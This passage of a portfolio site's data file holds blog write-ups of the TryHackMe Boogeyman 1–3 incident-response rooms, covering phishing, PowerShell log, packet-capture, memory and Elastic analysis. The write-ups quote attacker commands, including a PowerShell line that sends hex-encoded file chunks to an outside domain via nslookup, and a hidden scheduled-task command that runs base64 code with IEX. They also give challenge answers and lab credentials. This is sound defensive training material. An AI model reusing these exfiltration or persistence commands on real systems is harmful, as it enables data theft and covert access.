<p>The answer had to be put together from the beginning, and it unfortunately took me a while to figure that out. The <code>sq3.exe</code> binary is a lightweight tool used to query and steal data. The command at the end retrieved 100 columns for up to 100 rows.</p>
<p><strong>Answer:</strong></p>
<p><code>C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></p>
<h3>Question 4</h3>
<p><strong>Question:</strong> What is the software that uses the file in Question 3?</p>
<p><strong>Walkthrough:</strong> We can find this out by viewing the file location of where the file was taken from. In short, it was taken from the Microsoft package <strong>Sticky Notes</strong>.</p>
<p><strong>Answer:</strong> <code>Microsoft Sticky Notes</code></p>
<h3>Question 5</h3>
<p><strong>Question:</strong> What is the name of the exfiltrated file?</p>
<p><strong>Walkthrough:</strong> If we scroll a bit further down, we can see what the file is, as well as where it is being extracted to.</p>
<img src="Images/Pasted%20image%2020260603221246.png" alt="Pasted image 20260603221246.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<pre><code>protected_data.kdbx</code></pre>
<p><strong>Answer:</strong> <code>protected_data.kdbx</code></p>
<h3>Question 6</h3>
<p><strong>Question:</strong> What type of file is the exfiltrated file?</p>
<p><strong>Walkthrough:</strong> This requires a bit of external research since it is unrelated to the logs. After a quick Google search, I found out that it is a KeePass Password Database file type, which is used by a password manager to store passwords.</p>
<img src="Images/Pasted%20image%2020260603221715.png" alt="Pasted image 20260603221715.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>KeePass password database (.kdbx)</code></p>
<h3>Question 7</h3>
<p><strong>Question:</strong> What is the encoding used during the exfiltration attempt of the sensitive file?</p>
<p><strong>Walkthrough:</strong> We have all of the PowerShell commands within this log, so if we scroll a bit further down once more, we can see a line that is very familiar as part of the encoding process.</p>
<img src="Images/Pasted%20image%2020260603222332.png" alt="Pasted image 20260603222332.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<pre><code>"$split = $hex -split '(\\\\S{50})'; ForEach ($line in $split) { nslookup -q=A \\"$line.bpakcaging.xyz\\" $destination;} echo \\"Done\\";;pwd"}</code></pre>
<p><strong>Answer:</strong> <code>hex</code></p>
<h3>Question 8</h3>
<p><strong>Question:</strong> What is the tool used for exfiltration?</p>
<p><strong>Walkthrough:</strong> Within the same command that was used to encode the file, we can see the file host domains from earlier on being used, and that is where the file is being exfiltrated to. The tool being used for that is <code>nslookup</code>.</p>
<p><strong>Answer:</strong> <code>nslookup</code></p>
<h2>Task 3</h2>
<p>We have now found what damage was done through the attack. Julianne didn't have any permanent damage caused to her workstation or business infrastructure, but the attackers were able to use C2 to exfiltrate two files, which could result in a number of problems.</p>
<p>We were able to find out what domains, IP addresses, and ports the attacker used. This is where we will analyse the traffic through Wireshark to find out exactly what the attacker exfiltrated and how they performed the attack.</p>
<h3>Question 1</h3>
<p><strong>Question:</strong> What software is used by the attacker to host its presumed file/payload server?</p>
<p><strong>Walkthrough:</strong> I will admit I had a pretty miserable time with this question. I tried all types of search queries to find the answer. There were only two packets that contained the answer TryHackMe wanted, and it unfortunately came down to using a very specific search query to find it. I asked an AI bot what the answer was after 45 minutes of searching and then found the packet I was looking for.</p>
<img src="Images/Pasted%20image%2020260603234634.png" alt="Pasted image 20260603234634.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The distinct difference I found in the packet was the content type:</p>
<pre><code>application/x-msdos-program</code></pre>
<p>I had tried finding the request URI from the previous tasks (<code>hxxp://files.bpakcaging[.]xyz/sb.exe</code>), but I wasn't having much luck. I reverse-searched the query to find the correct query to search with, and it was:</p>
<pre><code>http.response_for.uri == "http://files.bpakcaging.xyz/sb.exe"</code></pre>
<p>I was pretty upset that I couldn't figure out this question, but I learned how I can search for this in the future now.</p>
<p><strong>Answer:</strong> <code>Python</code></p>
<h3>Question 2</h3>
<p><strong>Question:</strong> What HTTP method is used by the C2 for the output of the commands executed by the attacker?</p>
<p><strong>Walkthrough:</strong> This time I had more luck. We have knowledge of two malicious domains that were used to host tools and files.</p>
<img src="Images/Pasted%20image%2020260604000025.png" alt="Pasted image 20260604000025.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>We still have the terminal open just in case we need any more information, so I decided to search using one of the domains.</p>
<p>I used the query:</p>
<pre><code>http.host == cdn.bpakcaging.xyz:8080</code></pre>
<img src="Images/Pasted%20image%2020260604000454.png" alt="Pasted image 20260604000454.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>I found a packet that has the <code>POST</code> method with information regarding the application. I decided to follow the stream with HTTP and found proof of PowerShell usage.</p>
<img src="Images/Pasted%20image%2020260604000616.png" alt="Pasted image 20260604000616.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>POST</code></p>
<h3>Question 3</h3>
<p><strong>Question:</strong> What is the protocol used during the exfiltration activity?</p>
<p><strong>Walkthrough:</strong> In the previous task, we discovered that the tool the attacker was using was <code>nslookup</code>, which points us toward DNS-based exfiltration.</p>
<p><strong>Answer:</strong> <code>DNS</code></p>
<h3>Question 4</h3>
<p><strong>Question:</strong> What is the password of the exfiltrated file?</p>
<p><strong>Walkthrough:</strong> Here are the facts that we know:</p>
<ul>
<li>The file name.</li>
<li>The file was extracted and converted into hex.</li>
</ul>
<p>I went back to the PowerShell logs because I needed to find the time that the data was exfiltrated.</p>
<img src="Images/Pasted%20image%2020260604005859.png" alt="Pasted image 20260604005859.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>I now have the time the file was exfiltrated with <code>sq3.exe</code>. I can now look for a <code>POST</code> packet frame and search for any hex blocks.</p>
<img src="Images/Pasted%20image%2020260604010432.png" alt="Pasted image 20260604010432.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>I did find the packet frame by searching for the <code>POST</code> method.</p>
<img src="Images/Pasted%20image%2020260604011532.png" alt="Pasted image 20260604011532.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>All of this is the encoded file. We now need to decode it within CyberChef.</p>
<img src="Images/Pasted%20image%2020260604011617.png" alt="Pasted image 20260604011617.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>We get the password that was exfiltrated.</p>
<p><strong>Answer:</strong> <code>%p9^3!lL^Mz47E2GaT^y</code></p>
<h3>Question 5</h3>
<p><strong>Question:</strong> What is the credit card number stored inside the exfiltrated file?</p>
<p><strong>Walkthrough:</strong></p>
<p><code>tshark</code> comes with Wireshark and is specifically used within the command line. The first step we want to take is to narrow down the search to just the malicious domains we saw earlier, so that means any <code>dns.query.name</code> containing <code>bpakcaging</code>:</p>
<pre><code>tshark -r /home/ubuntu/Desktop/artefacts/capture.pcapng -Y 'dns &amp;&amp; dns.qry.name contains "bpakcaging"' -T fields -e dns.qry.name</code></pre>
<p>The results have narrowed everything down, but there's still a bit of noise. There are duplicates throughout the search, and because the chunks have been split apart, we need to concatenate all of the long hex code into one block so we can decode it within CyberChef.</p>
<img src="Images/Pasted%20image%2020260604101220.png" alt="Pasted image 20260604101220.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>You can now see why we needed to use tshark; we wouldn't be able to see this as clearly in Wireshark.</p>
<p>I'm not going to pretend I know the exact command-line arguments for tshark to concatenate this, so I did get some help from external resources such as Perplexity.</p>
<pre><code>tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' &gt; encode.txt</code></pre>
<p>To my understanding, this line will:</p>
<ul>
<li>Read the packet capture file.</li>
<li>Output a display filter for the packets we want.</li>
<li>Ask for the specific information inside the packets instead of general packet metadata.</li>
<li>Ask for the <code>dns.qry.name</code> field.</li>
<li>Remove entries containing <code>files</code> or <code>cdn</code>.</li>
<li>Join the resulting chunks into one line.</li>
<li>Output all of this into a text file.</li>
</ul>
<p>I then put this hex code into CyberChef to get the decoded value.</p>
<img src="Images/Pasted%20image%2020260604122348.png" alt="Pasted image 20260604122348.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>This is not human-readable, but if we save this into a <code>.kdbx</code> file, that makes sense because that is where the credit card info has been stored.</p>
<p>We can open KeePass2 and retrieve the password that we got from an earlier question. Since these VMs don't use the internet, I saved the password onto my own computer and downloaded KeePass onto my computer to complete this question.</p>
<img src="Images/Pasted%20image%2020260604122658.png" alt="Pasted image 20260604122658.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>We are then greeted with the credit card number at the bottom of the screen.</p>
<img src="Images/Pasted%20image%2020260604122910.png" alt="Pasted image 20260604122910.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>4024007128269551</code></p>
<h2>Commands Used</h2>
<pre><code>lnkparse Invoice_20230103.lnk
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}'
tshark -r /home/ubuntu/Desktop/artefacts/capture.pcapng -Y 'dns &amp;&amp; dns.qry.name contains "bpakcaging"' -T fields -e dns.qry.name
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' &gt; encode.txt</code></pre>
<h2>Final Thoughts</h2>
<p>This is the first challenge of the Boogeyman capstone challenges by TryHackMe.</p>
<p>I was able to confidently analyse email headers and PowerShell logs. When I got to two certain questions — what software the server was using and what the credit card number was — I struggled more when analysing the network traffic, and it required a fair bit of external research. I'm not ashamed that I had to do research, because that is going to happen when I am unfamiliar with certain patterns, such as hex being exfiltrated, but it is definitely going to be a pattern I will recognise more easily in the future.</p>
<p>I look forward to the other two Boogeyman challenges and may do a write-up on them too.</p>`,
            github: ''
        },
        'boogeyman2': {
            title: 'Boogeyman 2',
            description: 'A TryHackMe write-up covering email source analysis, VBA macro extraction with olevba, and raw memory analysis with Volatility.',
            tech: ['TryHackMe', 'Volatility', 'Olevba', 'Evolution'],
            features: ['Email header analysis', 'VBA macro extraction', 'Raw memory analysis'],
            extra: `<h2>Boogeyman 2</h2>
<blockquote><p><strong>Room Overview:</strong> After having a severe attack from the Boogeyman, Quick Logistics LLC improved its security defences. However, the Boogeyman returns with new and improved tactics, techniques and procedures.</p></blockquote>
<h2>Artifacts Used</h2>
<ul>
<li><code>Copy of Phishing Email</code></li>
<li><code>Memory Dump of Victim's Workstation</code></li>
</ul>
<hr>
<h2>Tools Used</h2>
<ul>
<li><code>Volatility</code> - An open-source framework for extracting digital artefacts from volatile memory (RAM) samples.</li>
<li><code>olevba</code> - A tool for analysing and extracting VBA macros from Microsoft Office documents.</li>
</ul>
<hr>
<h2>Notes</h2>
<p>This is the second room within the Boogeyman series. The Boogeyman series continues to focus on phishing attacks and analysis. I have not used many memory-analysis tools before, so I will do my best to understand the evidence and research anything I need along the way.</p>
<hr>
<h2>Introduction</h2>
<p>This room has a very small introduction and doesn't give you much of a scenario. There is also one continuous page of tasks (up to 15 questions).</p>
<p>Maxine, a human resources specialist working for the same logistics company from Boogeyman 1, received an application for an open position in the company. The email is as follows:</p>
<img src="Images/Pasted%20image%2020260606231804.png" alt="Phishing email received by Maxine" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The security team was alerted to suspicious commands on Maxine's workstation, so our job is to investigate if the alerts are a true positive and how the attacker was able to access the workstation/network, as well as what damage was committed.</p>
<hr>
<h3>Question 1</h3>
<p><strong>Question:</strong> What email was used to send the phishing email?</p>
<p><strong>Walkthrough:</strong> We don't have the Thunderbird client from the previous room so I will be using Evolution. I open up the message source to view the email headers and scroll down to find the attacker's email address.</p>
<img src="Images/Pasted%20image%2020260606235552.png" alt="Attacker email address in message source" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: westaylor23@outlook[.]com</strong></p>
<h3>Question 2</h3>
<p><strong>Question:</strong> What is the email of the victim employee?</p>
<p><strong>Walkthrough:</strong> Within that same image, the victim's email address is visible just a line down from the sender.</p>
<p><strong>Answer: maxine.beck@quicklogisticsorg[.]onmicrosoft[.]com</strong></p>
<h3>Question 3</h3>
<p><strong>Question:</strong> What is the name of the attached malicious document?</p>
<p><strong>Walkthrough:</strong> The attachment is labelled as the attacker's resume.</p>
<img src="Images/Pasted%20image%2020260607000333.png" alt="Malicious resume attachment" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: Resume_WesleyTaylor.doc</strong></p>
<h3>Question 4</h3>
<p><strong>Question:</strong> What is the MD5 hash of the malicious attachment?</p>
<p><strong>Walkthrough:</strong> Using a VM supplied by THM, I open the terminal in the saved document location and run:</p>
<pre><code>md5sum 'Resume_WesleyTaylor.doc'</code></pre>
<img src="Images/Pasted%20image%2020260607001235.png" alt="MD5 hash of malicious document" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: 52c4384a0b9e248b95804352ebec6c5b</strong></p>
<h3>Question 5</h3>
<p><strong>Question:</strong> What URL is used to download the stage 2 payload based on the document's macro?</p>
<p><strong>Walkthrough:</strong> Using olevba to analyse the macro in the document returns interesting details, including the URL used to download the next stage.</p>
<img src="Images/Pasted%20image%2020260607002149.png" alt="olevba output showing macro and download URL" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The macro downloads a PNG file obfuscated as a JavaScript file and then executes it. There is only one URL in the macro.</p>
<p><strong>Answer: hxxps://files.boogeymanisback[.]lol/aa2a9c53cbb80416d3b47d85538d9971/update[.]png</strong></p>
<h3>Question 6</h3>
<p><strong>Question:</strong> What is the name of the process that executed the newly downloaded stage 2 payload?</p>
<p><strong>Walkthrough:</strong> The last line of the macro executes the downloaded script.</p>
<img src="Images/Pasted%20image%2020260607003043.png" alt="Macro last line executing the stage 2 payload" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: wscript.exe</strong></p>
<h3>Question 7</h3>
<p><strong>Question:</strong> What is the full file path of the malicious stage 2 payload?</p>
<p><strong>Walkthrough:</strong> The payload was executed within ProgramData, visible next to the process name.</p>
<img src="Images/Pasted%20image%2020260607003617.png" alt="Stage 2 payload file path in ProgramData" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>C:\\ProgramData\\update.js</code></p>
<h3>Question 8</h3>
<p><strong>Question:</strong> What is the PID of the process that executed the stage 2 payload?</p>
<p><strong>Walkthrough:</strong> Switching to Volatility to analyse the memory dump. Using the pslist plugin to list all processes:</p>
<pre><code>vol -f WKSTN-2961.raw windows.pslist</code></pre>
<img src="Images/Pasted%20image%2020260607005157.png" alt="Volatility pslist output showing wscript.exe PID" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: 4260</strong></p>
<h3>Question 9</h3>
<p><strong>Question:</strong> What is the parent PID of the process that executed the stage 2 payload?</p>
<p><strong>Walkthrough:</strong> The PPID column is directly to the right of the PID in the pslist output.</p>
<p><strong>Answer: 1124</strong></p>
<h3>Question 10</h3>
<p><strong>Question:</strong> What URL is used to download the malicious binary executed by the stage 2 payload?</p>
<p><strong>Walkthrough:</strong> The PNG file downloaded earlier was actually an executable JavaScript file. The URL for the binary is also within the macro output.</p>
<p><strong>Answer: hxxps://files.boogeymanisback[.]lol/aa2a9c53cbb80416d3b47d85538d9971/update[.]exe</strong></p>
<h3>Question 11</h3>
<p><strong>Question:</strong> What is the PID of the malicious process used to establish the C2 connection?</p>
<p><strong>Walkthrough:</strong> The macro establishes a C2 connection via a reverse shell. Using the netscan plugin to find network objects:</p>
<img src="Images/Pasted%20image%2020260607120509.png" alt="Macro reverse shell section" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260607124001.png" alt="Volatility plugin documentation for netscan" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<pre><code>vol -f WKSTN-2961.raw windows.netscan</code></pre>
<img src="Images/Pasted%20image%2020260607124559.png" alt="netscan output showing updater.exe PID" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: 6216</strong></p>
<h3>Question 12</h3>
<p><strong>Question:</strong> What is the full file path of the malicious process used to establish the C2 connection?</p>
<p><strong>Walkthrough:</strong> Using the filescan plugin with grep to find updater.exe:</p>
<img src="Images/Pasted%20image%2020260607125427.png" alt="Volatility filescan plugin" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<pre><code>vol -f WKSTN-2961.raw windows.filescan | grep 'updater.exe'</code></pre>
<img src="Images/Pasted%20image%2020260607130319.png" alt="filescan output showing updater.exe full path" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>C:\\Windows\\Tasks\\updater.exe</code></p>
<h3>Question 13</h3>
<p><strong>Question:</strong> What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)</p>
<p><strong>Walkthrough:</strong> The netscan results from earlier also include the destination IP and port for updater.exe.</p>
<img src="Images/Pasted%20image%2020260607131322.png" alt="netscan output showing C2 IP and port" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: 128.199.95.189:8080</strong></p>
<h3>Question 14</h3>
<p><strong>Question:</strong> What is the full file path of the malicious email attachment based on the memory dump?</p>
<p><strong>Walkthrough:</strong> Using filescan with grep to locate the resume attachment:</p>
<pre><code>vol -f WKSTN-2961.raw windows.filescan | grep 'Resume_WesleyTaylor'</code></pre>
<img src="Images/Pasted%20image%2020260607132529.png" alt="filescan output showing attachment file path" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>C:\\Users\\maxine.beck\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\WQHGZCFI\\Resume_WesleyTaylor (002).doc</code></p>
<h3>Question 15</h3>
<p><strong>Question:</strong> The attacker implanted a scheduled task right after establishing the C2 callback. What is the full command used by the attacker to maintain persistent access?</p>
<p><strong>Walkthrough:</strong> Searching the raw file for schtasks as a string:</p>
<pre><code>strings WKSTN-2961.raw | grep 'schtasks'</code></pre>
<img src="Images/Pasted%20image%2020260607133104.png" alt="Scheduled task plugin attempt" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260607135112.png" alt="schtasks strings output revealing the scheduled task command" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The grouped base64 section and the IEX function immediately stand out as the hidden scheduled task.</p>
<p><strong>Answer:</strong> <code>schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\"'</code></p>
<hr>
<h2>Final Thoughts</h2>
<p>This room didn't take very long to complete. I thought it was quite linear and involved switching back and forth between olevba and Volatility. I'm glad I got to learn about those tools — they are the highlight of this room.</p>`,
            github: ''
        },
        'boogeyman3': {
            title: 'Boogeyman 3',
            description: 'A TryHackMe write-up covering Elastic-based analysis of a CEO whaling attack, UAC bypass, credential dumping, lateral movement, and ransomware deployment.',
            tech: ['TryHackMe', 'Elastic'],
            features: ['Elastic SIEM analysis', 'Credential dumping', 'Lateral movement', 'Ransomware investigation'],
            extra: `<h2>Boogeyman 3</h2>
<blockquote><p><strong>Room Overview:</strong> Due to the previous attacks of Boogeyman, Quick Logistics LLC hired a managed security service provider to handle its Security Operations Centre. Little did they know, the Boogeyman was still lurking and waiting for the right moment to return.</p></blockquote>
<h2>Tools Used</h2>
<ul>
<li><code>Elastic</code></li>
</ul>
<hr>
<h2>Notes</h2>
<p>This is the last room within the Boogeyman series. Rooms 1 and 2 were quite manageable up until the last two questions where the difficulty scaling increases dramatically. This is also the last room of the THM SOC Analyst Path L1.</p>
<hr>
<h2>Introduction</h2>
<p>This room is run with Elastic instead of Splunk. The Boogeyman has compromised an employee for a third time — this time the victim is the company's CEO, making this a whaling attack since the target is a high-value individual.</p>
<img src="Images/Pasted%20image%2020260608105020.png" alt="Phishing email received by Evan" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The email looked questionable but Evan (the victim) opened the attachment and then reported it to the security team.</p>
<img src="Images/Pasted%20image%2020260608110353.png" alt="Payload found in downloads folder" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260608110649.png" alt="Payload found on DVD drive" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>They were also able to find a payload in the downloads folder and on the DVD drive. The incident occurred between August 29 and August 30, 2023.</p>
<hr>
<h3>Question 1</h3>
<p><strong>Question:</strong> What is the PID of the process that executed the initial stage 1 payload?</p>
<p><strong>Walkthrough:</strong> Using Elastic's search with winlog event ID 1 (process creation) and the payload name:</p>
<pre><code>winlog.event_id : 1 and *ProjectFinancialSummary_Q3.pdf*</code></pre>
<img src="Images/Pasted%20image%2020260608120052.png" alt="Elastic search result for stage 1 payload" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260608120139.png" alt="PID visible at bottom of event" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>One event is returned. Scrolling to the bottom reveals the PID.</p>
<p><strong>Answer: 6392</strong></p>
<h3>Question 2</h3>
<p><strong>Question:</strong> The stage 1 payload attempted to implant a file to another location. What is the full command-line value of this execution?</p>
<p><strong>Walkthrough:</strong> Using the PID from the previous question as the parent PID:</p>
<pre><code>winlog.event_id : 1 and process.parent.pid 6392</code></pre>
<img src="Images/Pasted%20image%2020260608124543.png" alt="xcopy command implanting review.dat" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>One of the results shows xcopy being used to copy review.dat into Evan's temp folder.</p>
<p><strong>Answer:</strong> <code>"C:\\Windows\\System32\\xcopy.exe" /s /i /e /h D:\\review.dat C:\\Users\\EVAN~1.HUT\\AppData\\Local\\Temp\\review.dat</code></p>
<h3>Question 3</h3>
<p><strong>Question:</strong> The implanted file was eventually used and executed by the stage 1 payload. What is the full command-line value of this execution?</p>
<p><strong>Walkthrough:</strong> Within the same search, another event just above shows the execution of review.dat via rundll32.</p>
<img src="Images/Pasted%20image%2020260608130037.png" alt="rundll32 executing review.dat" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>"C:\\Windows\\System32\\rundll32.exe" D:\\review.dat,DllRegisterServer</code></p>
<h3>Question 4</h3>
<p><strong>Question:</strong> The stage 1 payload established a persistence mechanism. What is the name of the scheduled task created by the malicious script?</p>
<p><strong>Walkthrough:</strong> Within the same search results, a command line creating a scheduled task is visible, with the task name at the end.</p>
<img src="Images/Pasted%20image%2020260608130500.png" alt="Scheduled task creation command" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: Review</strong></p>
<h3>Question 5</h3>
<p><strong>Question:</strong> The execution of the implanted file inside the machine has initiated a potential C2 connection. What is the IP and port used by this connection? (format: IP:port)</p>
<p><strong>Walkthrough:</strong> Searching for winlog event ID 3 (network connection established), filtered to the user and process:</p>
<pre><code>winlog.event_id : 3 and user.name : "evan.hutchinson" and *rundll32.exe*</code></pre>
<img src="Images/Pasted%20image%2020260608134954.png" alt="C2 connection destination IP and port" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>Around 14,000 events are returned, all pointing to the same destination IP and port.</p>
<p><strong>Answer: 165.232.170.151:80</strong></p>
<h3>Question 6</h3>
<p><strong>Question:</strong> The attacker has discovered that the current access is a local administrator. What is the name of the process used by the attacker to execute a UAC bypass?</p>
<p><strong>Walkthrough:</strong> After researching UAC bypass techniques via an <a href="https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies" target="_blank">Elastic article</a>, <code>fodhelper.exe</code> stood out — it is a Windows binary that allows elevation without a UAC prompt.</p>
<img src="Images/Pasted%20image%2020260608190652.png" alt="Elastic article on UAC bypass via fodhelper" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260608190824.png" alt="fodhelper.exe process execution events" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>Searching for <code>fodhelper</code> returns three process execution events, confirming this is the process used.</p>
<p><strong>Answer: fodhelper.exe</strong></p>
<h3>Question 7</h3>
<p><strong>Question:</strong> Having high-privilege machine access, the attacker attempted to dump the credentials inside the machine. What is the GitHub link used by the attacker to download a tool for credential dumping?</p>
<p><strong>Walkthrough:</strong> Searching loosely for GitHub events (unlikely for a CEO to visit GitHub) returns 149 hits, the majority pointing to one link — Mimikatz.</p>
<img src="Images/Pasted%20image%2020260608191310.png" alt="GitHub link for Mimikatz download" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: hxxps://github[.]com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk[.]zip</strong></p>
<h3>Question 8</h3>
<p><strong>Question:</strong> After successfully dumping the credentials inside the machine, the attacker used the credentials to gain access to another machine. What is the username and hash of the new credential pair? (format: username:hash)</p>
<p><strong>Walkthrough:</strong> Searching for Mimikatz process creations:</p>
<pre><code>winlog.event_id: 1 and process.command_line: *mimikatz.exe*</code></pre>
<p>11 hits appear on a new hostname (WKSTN-1327). Examining the command line output reveals the attacker is targeting user <code>itadmin</code>.</p>
<img src="Images/Pasted%20image%2020260608203102.png" alt="Mimikatz command line on Allan Smith's PC" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260608203424.png" alt="itadmin credentials and hash" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: itadmin:F84769D250EB95EB2D7D8B4A1C5613F2</strong></p>
<h3>Question 9</h3>
<p><strong>Question:</strong> Using the new credentials, the attacker attempted to enumerate accessible file shares. What is the name of the file accessed by the attacker from a remote share?</p>
<p><strong>Walkthrough:</strong> Searching with double backslashes to find share access events:</p>
<pre><code>*\\\\WKSTN\\\\*</code></pre>
<img src="Images/Pasted%20image%2020260608214719.png" alt="Share enumeration revealing IT_Automation.ps1" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>This reveals the share name and the enumeration attempt, including the accessed file.</p>
<p><strong>Answer: IT_Automation.ps1</strong></p>
<h3>Question 10</h3>
<p><strong>Question:</strong> After getting the contents of the remote file, the attacker used the new credentials to move laterally. What is the new set of credentials discovered by the attacker? (format: username:password)</p>
<p><strong>Walkthrough:</strong> PSCredential is a PowerShell module for managing credentials. Searching for it:</p>
<pre><code>*PSCredential*</code></pre>
<img src="Images/Pasted%20image%2020260608215936.png" alt="PSCredential with plaintext username and password" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The username and password appear in plaintext within the results.</p>
<p><strong>Answer: QUICKLOGISTICS\\allan.smith:Tr!ckyP@ssw0rd987</strong></p>
<h3>Question 11</h3>
<p><strong>Question:</strong> What is the hostname of the attacker's lab machine for its lateral movement attempt?</p>
<p><strong>Walkthrough:</strong> The workstation name is visible within the same PowerShell command found in the previous question.</p>
<img src="Images/Pasted%20image%2020260608220327.png" alt="Workstation hostname in PowerShell command" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer: WKSTN-1327</strong></p>
<h3>Question 12</h3>
<p><strong>Question:</strong> Using the malicious command executed by the attacker from the first machine to move laterally, what is the parent process name of the malicious command executed on the second compromised machine?</p>
<p><strong>Walkthrough:</strong> Filtering for process creation events on the new workstation:</p>
<pre><code>*WKSTN-1327* and event.code: 1</code></pre>
<img src="Images/Pasted%20image%2020260608222630.png" alt="Process creation events on WKSTN-1327" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260608223004.png" alt="ransomboogey.exe child process with wsmprovhost.exe parent" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>195 events appear. Scrolling through reveals a child process named <code>ransomboogey.exe</code> within the <code>itadmin</code> user folder, identifying the parent process.</p>
<p><strong>Answer: wsmprovhost.exe</strong></p>
